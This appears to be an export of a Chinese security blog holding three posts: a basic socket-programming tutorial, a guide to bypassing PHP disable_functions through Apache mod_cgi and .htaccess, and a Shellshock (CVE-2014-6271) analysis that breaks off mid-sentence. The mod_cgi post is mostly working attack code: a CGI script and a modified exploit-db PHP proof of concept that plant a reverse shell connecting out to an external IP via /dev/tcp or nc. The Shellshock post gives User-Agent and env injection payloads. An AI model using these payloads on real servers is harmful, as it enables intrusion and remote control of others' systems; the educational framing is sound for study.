        <content type="html"><![CDATA[<h1 id="简单理解socket"><a href="#简单理解socket" class="headerlink" title="简单理解socket"></a>简单理解socket</h1><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>我们知道两个进程如果需要进行通讯最基本的一个前提能能够唯一的标示一个进程，在本地进程通讯中我们可以使用PID来唯一标示一个进程，但PID只在本地唯一，网络中的两个进程PID冲突几率很大，这时候我们需要另辟它径了，我们知道IP层的ip地址可以唯一标示主机，而TCP层协议和端口号可以唯一标示主机的一个进程，这样我们可以利用ip地址＋协议＋端口号唯一标示网络中的一个进程。</p><p>能够唯一标示网络中的进程后，它们就可以利用socket进行通信了，什么是socket呢？我们经常把socket翻译为套接字，socket是在应用层和传输层之间的一个抽象层，它把TCP/IP层复杂的操作抽象为几个简单的接口供应用层调用已实现进程在网络中通信。</p><p><img src="/img/05225723-2ffa89aad91f46099afa530ef8660b20.jpg" alt="img"></p><p>socket起源于UNIX，在Unix一切皆文件哲学的思想下，socket是一种”打开—读/写—关闭”模式的实现，服务器和客户端各自维护一个”文件”，在建立连接打开后，可以向自己文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件。</p><h3 id="socket通信流程"><a href="#socket通信流程" class="headerlink" title="socket通信流程"></a>socket通信流程</h3><p>socket是”打开—读/写—关闭”模式的实现，以使用TCP协议通讯的socket为例，其交互流程大概是这样子的</p><p><img src="/img/05232335-fb19fc7527e944d4845ef40831da4ec2.png" alt="img"></p><p>服务器根据地址类型（ipv4,ipv6）、socket类型、协议创建socket</p><p>服务器为socket绑定ip地址和端口号</p><p>服务器socket监听端口号请求，随时准备接收客户端发来的连接，这时候服务器的socket并没有被打开</p><p>客户端创建socket</p><p>客户端打开socket，根据服务器ip地址和端口号试图连接服务器socket</p><p>服务器socket接收到客户端socket请求，被动打开，开始接收客户端请求，直到客户端返回连接信息。这时候socket进入<strong>阻塞</strong>状态，所谓阻塞即accept()方法一直到客户端返回连接信息后才返回，开始接收下一个客户端谅解请求</p><p>客户端连接成功，向服务器发送连接状态信息</p><p>服务器accept方法返回，连接成功</p><p>客户端向socket写入信息</p><p>服务器读取信息</p><p>客户端关闭</p><p>服务器端关闭</p><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>在TCP/IP协议中，TCP协议通过三次握手建立一个可靠的连接</p><p><img src="/img/05234233-eed6ddcba93c42be8847e98d6da62802.jpg" alt="img"></p><p>第一次握手：客户端尝试连接服务器，向服务器发送syn包（同步序列编号<strong><em>Synchronize Sequence Numbers</em></strong>），syn=j，客户端进入SYN_SEND状态等待服务器确认</p><p>第二次握手：服务器接收客户端syn包并确认（ack=j+1），同时向客户端发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态</p><p>第三次握手：第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手</p><p>定睛一看，服务器socket与客户端socket建立连接的部分其实就是大名鼎鼎的三次握手</p><p><img src="/img/05234946-b80841921eae4d2ab983f26ed9023768.png" alt="img"></p><p> <strong>socket编程API</strong></p><p>前面提到socket是”打开—读/写—关闭”模式的实现，简单了解一下socket提供了哪些API供应用程序使用，还是以TCP协议为例，看看Unix下的socket API，其它语言都很类似（PHP甚至名字都几乎一样），这里我就简单解释一下方法作用和参数，具体使用有兴趣同学可以看看博客参考中的链接或者上网搜索</p><pre><code>int socket(int domain, int type, int protocol);</code></pre><p>根据指定的地址族、数据类型和协议来分配一个socket的描述字及其所用的资源。</p><p>domain:协议族，常用的有AF_INET、AF_INET6、AF_LOCAL、AF_ROUTE其中AF_INET代表使用ipv4地址</p><p>type:socket类型，常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等</p><p>protocol:协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等</p><pre><code>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code></pre><p>把一个地址族中的特定地址赋给socket</p><p>sockfd:socket描述字，也就是socket引用</p><p>addr:要绑定给sockfd的协议地址</p><p>addrlen:地址的长度</p><p><em>通常服务器在启动的时候都会绑定一个众所周知的地址（如ip地址+端口号），用于提供服务，客户就可以通过它来接连服务器；而客户端就不用指定，有系统自动分配一个端口号和自身的ip地址组合。这就是为什么通常服务器端在listen之前会调用bind()，而客户端就不会调用，而是在connect()时由系统随机生成一个。</em></p><pre><code>int listen(int sockfd, int backlog);</code></pre><p>监听socket</p><p>sockfd:要监听的socket描述字</p><p>backlog:相应socket可以排队的最大连接个数 </p><pre><code>int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code></pre><p>连接某个socket</p><p>sockfd:客户端的socket描述字</p><p>addr:服务器的socket地址</p><p>addrlen:socket地址的长度</p><pre><code>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);</code></pre><p> TCP服务器监听到客户端请求之后，调用accept()函数取接收请求</p><p>sockfd:服务器的socket描述字</p><p>addr:客户端的socket地址</p><p>addrlen:socket地址的长度</p><pre><code>ssize_t read(int fd, void *buf, size_t count);</code></pre><p>读取socket内容</p><p>fd:socket描述字</p><p>buf：缓冲区</p><p>count：缓冲区长度</p><pre><code>ssize_t write(int fd, const void *buf, size_t count);</code></pre><p>向socket写入内容，其实就是发送内容</p><p>fd:socket描述字</p><p>buf：缓冲区</p><p>count：缓冲区长度</p><pre><code>int close(int fd);</code></pre><p>socket标记为以关闭 ，使相应socket描述字的引用计数-1，当引用计数为0的时候，触发TCP客户端向服务器发送终止连接请求。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Apache mod_cgi进行bypass disabled_function攻击</title>
      <link href="/2021/03/06/2021-3-6-apache-cgi-mod/"/>
      <url>/2021/03/06/2021-3-6-apache-cgi-mod/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Apache-mod-cgi进行bypass-disabled-function"><a href="#利用Apache-mod-cgi进行bypass-disabled-function" class="headerlink" title="利用Apache mod_cgi进行bypass disabled_function"></a>利用Apache mod_cgi进行bypass disabled_function</h1><h3 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h3><p>公共网关接口，就是web服务器可以加载的外部程序规范，CGI脚本即使用遵从该规范编写的外部程序。</p><p>CGI编程没有特定的语言,C语言,python,linux shell,perl,vb等等都可以进行CGI编程.</p><p><strong>使用linux shell脚本编写的cgi程序便可以执行系统命令</strong>.</p><p>MOD_CGI<br>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过三种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，一种是文件位于ScriptAlias目录中，最后一种是在目录放入<code>.htaccess</code>文件，规定将某个后缀的文件按cgi脚本解析。</p><p>apache在配置cgi后可以用ScriptAlias指令指定一个目录,指定的目录下面便存放可执行的cgi程序.若是想要增加文件夹也可执行cgi程序,则可在apache主配置文件中做如下设置</p><pre class="line-numbers language-ini"><code class="language-ini">&lt;Directory PATH>Options +ExecCGI&lt;/Directory><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例如</p><pre class="line-numbers language-ini"><code class="language-ini">&lt;Directory /var/www/html/>Options +ExecCGI                      #这便是在“/var/www/html/”这个路径下允许cgi程序执行&lt;/Directory><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然,若是想临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序,则可以在目的目录下使用htaccess文件进行配置,如下:</p><p>.cnm后缀.  <strong>这个玩意儿纯属自定义，只要不与其他文件类型的后缀冲突即可</strong></p><pre><code>Options +ExecCGIAddHandler cgi-script .cnm</code></pre><h2 id="攻击原理和方式"><a href="#攻击原理和方式" class="headerlink" title="攻击原理和方式"></a>攻击原理和方式</h2><p><strong>步骤：</strong></p><p>1.在Apache允许允许使用<code>.htaccess</code> 的目录 放入<code>.htaccess</code>文件，用于把你上传的某个文件解析成cgi脚本。如果Apache本来就允许某个目录执行cgi脚本，则可以省略这一步骤。</p><pre class="line-numbers language-ini"><code class="language-ini">Options +ExecCGIAddHandler cgi-script .cnm        //把.cnm后缀的文件按cgi脚本解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>2.上传你的cgi脚本</p><p>例如</p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashecho -ne "Content-Type: text/html\n\n"          //如果要进行反弹shell才需要这条命令，否则会500//使用其它命令则可以直接执行,不需要上面这条语句bash -i >& /dev/tcp/121.4.101.246/9999 0>&1        //反弹shell或者任意www-data用户可以执行的命令都可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3.上传一个php或者html文件引用执行这个cgi脚本</p><p>例如</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"cgi.cnm"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//记住必须要为cgi脚本赋予执行权限</span><span class="token keyword">echo</span> <span class="token string">"&lt;img src = 'shell.cnm' style = 'display:none;'>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>4.访问该php页面，使得cgi脚本执行（直接访问cgi脚本没用，因为还没给它添加执行权限）。</p><p>exploitdb上有一个很好用的poc，我进行了一些个人修改</p><p>mod_cgi.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// $cmd = "nc -c '/bin/bash' 121.4.101.xxx 9999"; //command to be executed</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"bash -i >&amp; /dev/tcp/121.4.101.xxx/9999 0>&amp;1"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//command to be executed 有时候环境中有可能没有nc命令，可以多试试其它的命令</span><span class="token variable">$shellfile</span> <span class="token operator">=</span> <span class="token string">"#!/bin/bash\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//using a shellscript</span><span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//header is needed, otherwise a 500 error is thrown when there is output</span><span class="token comment" spellcheck="true">//如果直接执行命令则不需要这第二行，但反弹shell需要，否则会500</span><span class="token variable">$shellfile</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"$cmd"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//executing $cmd</span><span class="token keyword">function</span> <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token variable">$condition</span><span class="token punctuation">,</span><span class="token variable">$yes</span><span class="token punctuation">,</span><span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//this surely can be shorter</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"$text: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$condition</span> <span class="token operator">?</span> <span class="token variable">$yes</span> <span class="token punctuation">:</span> <span class="token variable">$no</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'checked'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> <span class="token string">"\nSetEnv HTACCESS on"</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Append it to a .htaccess file to see whether .htaccess is allowed</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: '</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">'?checked=true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//execute the script again to see if the htaccess test worked</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$modcgi</span> <span class="token operator">=</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token string">'mod_cgi'</span><span class="token punctuation">,</span> <span class="token function">apache_get_modules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// mod_cgi enabled?</span>    <span class="token variable">$writable</span> <span class="token operator">=</span> <span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//current dir writable?</span>    <span class="token variable">$htaccess</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTACCESS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//htaccess enabled?</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Mod-Cgi enabled"</span><span class="token punctuation">,</span><span class="token variable">$modcgi</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Is writable"</span><span class="token punctuation">,</span><span class="token variable">$writable</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"htaccess working"</span><span class="token punctuation">,</span><span class="token variable">$htaccess</span><span class="token punctuation">,</span><span class="token string">"Yes"</span><span class="token punctuation">,</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$modcgi</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$writable</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$htaccess</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Error. All of the above must be true for the script to work!"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//abort if not</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Backing up .htaccess"</span><span class="token punctuation">,</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token string">".htaccess"</span><span class="token punctuation">,</span><span class="token string">".htaccess.bak"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Suceeded! Saved in .htaccess.bak"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//make a backup, cause you never know.</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Write .htaccess file"</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span><span class="token string">"Options +ExecCGI\nAddHandler cgi-script .cnm"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//.dizzle is a nice extension</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Write shell file"</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'shell.cnm'</span><span class="token punctuation">,</span><span class="token variable">$shellfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//write the file</span>        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token string">"Chmod 777"</span><span class="token punctuation">,</span><span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"shell.cnm"</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Succeeded!"</span><span class="token punctuation">,</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//rwx</span>        <span class="token keyword">echo</span> <span class="token string">"Executing the script now. Check your listener &lt;img src = 'shell.cnm' style = 'display:none;'>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//call the script</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> PHP </tag>
            
            <tag> bypass disable functions </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellshock漏洞原理浅析</title>
      <link href="/2021/03/05/2021-3-5-shellshock-lou-dong-yuan-li/"/>
      <url>/2021/03/05/2021-3-5-shellshock-lou-dong-yuan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="浅析shellshock漏洞原理"><a href="#浅析shellshock漏洞原理" class="headerlink" title="浅析shellshock漏洞原理"></a>浅析shellshock漏洞原理</h1><h3 id="ShellShock-CVE-2014-6271"><a href="#ShellShock-CVE-2014-6271" class="headerlink" title="ShellShock ( CVE-2014-6271 )"></a><a href="https://www.exploit-db.com/exploits/34765" target="_blank" rel="noopener">ShellShock ( CVE-2014-6271 )</a></h3><p>虽然该漏洞的名称为 <code>ShellShock</code>( 中译为 “ Shell 破壳漏洞 “ ) , 但实际上是产生于 <strong><code>GNU BASH( Bourne Again Shell )</code></strong> . Bash是一个命令处理器 , 通常运行于文本窗口中 , 能执行用户输入的命令 . 有关 Bash 的相关内容可以参考 <strong><a href="https://zh.wikipedia.org/wiki/Bash" target="_blank" rel="noopener">维基百科</a></strong> , 这里就不多说了 .</p><p>而 <code>ShellShock</code> 漏洞是在 2014 年 9月 被披露的 , 该漏洞最早可以追溯到 1989 年发布的 Bash 1.03 版本 , 距今已有快30年了 . 在漏洞刚被披露时 , 其严重性直接被定义为 10 级( 最高级别 ) , 要知道同年 4 月爆发的 “ OpenSSL 心脏出血 “ 漏洞才 5 级 , 可见其危害性之大 , 影响范围之广 .</p><p>好了 , 不多说了 , 来看一看 <strong><code>ShellShock</code></strong> 漏洞到底是怎么一回事</p><hr><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>在 <strong><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub</a></strong> 有搭建好的 Docker 环境 , 我们可以直接运行 .</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-24.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-24.png" alt="img"></a></p><ul><li><strong>在浏览器访问 : <code>http://127.0.0.1:8000/victim.cgi</code> , 即可看到存在 <code>ShellShock</code> 漏洞的界面</strong></li></ul><p>  <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-33.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-33.png" alt="img"></a></p><ul><li><strong>在浏览器访问 : <code>http://127.0.0.1:8000/safe.cgi</code> , 即可看到修复 <code>ShellShock</code> 漏洞后的界面</strong></li></ul><p>  <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-31.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-03_22-31.png" alt="img"></a></p><p>然后根据给出的 POC , 可以构造 Payload 来利用存在 <code>ShellShock</code> 漏洞的 <code>victim.cgi</code> 文件 , 如下</p><p><strong>Payload : <code>() { foo; };echo;/usr/bin/id</code></strong></p><p>将该 Payload 放置于 HTTP 数据报头的 <code>User-Agent</code> 字段中 , 然后通过 <code>Curl</code> 工具构造发送 .</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-30.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-30.png" alt="img"></a></p><p>可以看到我们植入的 Payload 被成功的执行了 . 而当我们攻击安全的 <code>safe.cgi</code> 文件时 , 服务器仅会返回正常的 HTML 页面 .</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-35.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-35.png" alt="img"></a></p><p>那么这个任意代码执行的漏洞究竟是如何产生的呢 ? 下面我们来简单分析一下 .</p><hr><h4 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h4><p>在 bash 中可以自定义 Shell 变量 , 如下所示</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-54.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_14-54.png" alt="img"></a></p><p>但此时该变量仅是当前 Shell 的一个局部变量 , 只有在当前 Shell 进程中可以调用 . 即使是当前 Shell Fork 出的子进程 , 也是不能访问该变量的 .</p><p>为此 , 我们可以通过 export 命令 , 将该变量转变为一个环境变量 , 这样当前 Shell 的子进程就可以访问它了</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-00.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-00.png" alt="img"></a></p><p>不仅如此 , 在 Bash 中还可以定义 Shell 函数并将其导出为环境函数 , 只需要指明 <code>-f</code> 参数即可</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-08.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-04_15-08.png" alt="img"></a></p><p>上图这种函数的定义方法是非常普遍的 , 很容易理解 . 但在 Bash 中还有一种独有的方法来定义函数 , 即 : <strong>通过环境变量来定义函数</strong></p><p>当某个环境变量的值以字符串 “ <code>() {</code> “ 的格式作为开头( 注意大括号与小括号间的空格不能少 ) , 那么该变量就会被当前 Bash 当作一个导出函数( <code>export function</code> ) , 该函数仅会在当前 Bash 的子进程中生效 . 在很多文章中会把它称为 Bash 的 “<code>自动导入机制( 自动导入函数到当前 Bash 的子进程 )</code> “</p><p><em>由于 <code>ShellShock</code> 漏洞的危害性之大 , 很多 Linux 发行版都默认关闭了 Bash 的自动导入机制 , 所以下面采用 bash 4.3.0 作为实验环境</em></p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_09-58.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_09-58.png" alt="img"></a></p><p>因为这种独特的函数定义方式仅会在当前 bash 的子进程中生效 , 所以网络上很多帖子给出的 POC 都是下面这样 .</p><p><strong><code>POC : env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></strong></p><pre><code>     env : 设置环境变量后执行程序     bash -c : 启动一个新的Bash , 然后执行后面的命令 . 只有子进程开启时才会其解析环境变量中函数的定义</code></pre><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-11_1.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-11_1.png" alt="img"></a></p><p>通过 <code>bash -c</code> 开启当前 Bash 的子进程 , 在子进程载入时会初始化用户环境变量 , 在初始化时发现了包含 “<code>() {</code>“ 格式的字符串 , 所以将该字符串作为一个自动导入函数 . 但由于没有判断函数定义的结束 , 所以错误的将该函数定义后的语句也初始化并当作命令执行了 . 所以子 Bash 会执行该语句并输出 <code>vulnerable</code> , 然后再输出 <code>this is a test</code> .</p><p>简单的说 , 就是将恶意命令添加到合法的Bash函数定义后 , 在启动子进程时 , Bash 会先执行恶意命令 , 然后再执行正常的指令 .</p><p>在 <strong><a href="https://wooyun.js.org/drops/Shellshock漏洞回顾与分析测试.html" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试</a></strong> 中有一副图做的非常棒 , 十分容易理解 , 这里贴出来 .</p><p><a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-22.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_10-22.png" alt="img"></a></p><p>其实这是一种注入攻击 , 其本质就是<strong>数据( 环境变量 )与代码( 恶意命令 )未分离</strong> . 攻击者可以通过构造恶意参数使得解析器错误地执行了数据中的恶意命令 .</p><hr><h4 id="Bash-4-3-源代码分析"><a href="#Bash-4-3-源代码分析" class="headerlink" title="Bash 4.3 源代码分析"></a>Bash 4.3 源代码分析</h4><p>上面简单的谈了下 <code>ShellShock</code> 漏洞产生的原因 , 但具体的细节还没有说清楚 . 下面针对 <code>Bash 4.3.0</code> 的源码进行分析 .</p><ol><li><p><strong>首先从 <a href="https://ftp.gnu.org/gnu/bash/" target="_blank" rel="noopener">GNU.ORG</a> 上下载一份 Bash 4.3 的源码</strong></p></li><li><p><strong><code>variables.c : 315</code></strong></p><p>因为 ShellShock 触发于 Bash 子进程初始化环境变量的时候 . 所以我们进入 <code>variables.c</code> 文件 , 找到 <strong><code>initialize_shell_variables()</code></strong> 函数 .</p></li></ol><p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-40.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-40.png" alt="img"></a></p><p>   这里先定义了一些参数 , 然后循环遍历所有环境变量 , 通过 “ = “ 来分割变量名与变量值 .</p><p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-44.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-44.png" alt="img"></a></p><p>   注释写的很清楚 , 先判断刚才获取到的环境变量中是否有不合法的( 比如 “<code>=xxx</code>“ 或者没有等号的 ) . 如果发现不合法的变量 , 就跳过它们 .</p><p>   然后会将所有合法的环境变量进行赋值操作 , 其中</p><pre><code>    name : 环境变量名    string : 环境变量值    char_index : 环境变量名的长度</code></pre><p>   <a href="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-49.png" target="_blank" rel="noopener"><img src="http://www.guildhab.top/wp-content/uploads/2019/11/2019-11-05_11-49.png" alt="img"></a></p><p>   这里比较重要 , Google 上很多帖子也把这里作为 ShellShock 漏洞产生的地点 . 此处先判断是否存在自动导出函数( 通过 “<code>() {</code>“ 来判断 ) , 若存在就将其定义为一个函数 . 同时判断当前是否处于 <code>privileged mode</code> ,若不处于该模式就将之前导出的函数导入到新的环境变量中 .</p><p>   注意这里 , string( 获取到的环境变量值 ) 没有进行任何过滤 , 就被放入到 <strong><code>parse_and_execute</code></strong> 函数中 . 这是典型的注入漏洞 .</p><p>   值得一提的是这个 <code>privieged mode</code> , 因为根据源代码 , 若当前环境处于该模式下 , <code>ShellShock</code> 攻击将不会成功 .</p><pre><code>    privileged mode 即为 " 特权模式 " , 要求目标进程的 real-UID 与 effective UID 一致    real-UID 指定是谁启动了目标进程 , 而 effective-UID 指定目标进程可以访问哪些资源 .     通常情况下 , 这两个值是相同的 , 但如果调用了 setuid() 这类函数 , 